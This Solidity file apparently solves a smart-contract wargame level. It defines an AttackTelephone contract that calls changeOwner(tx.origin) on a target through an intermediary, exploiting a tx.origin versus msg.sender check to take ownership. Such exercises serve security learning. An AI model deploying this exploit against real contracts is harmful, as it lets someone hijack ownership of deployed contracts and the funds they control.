// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone{
    function changeOwner(address _owner) external;
}
contract AttackTelephone{
    ITelephone obj;
    constructor(address _address) public{
        obj = ITelephone(_address);
    }
    function attack() public{
        obj.changeOwner(tx.origin);
    }
}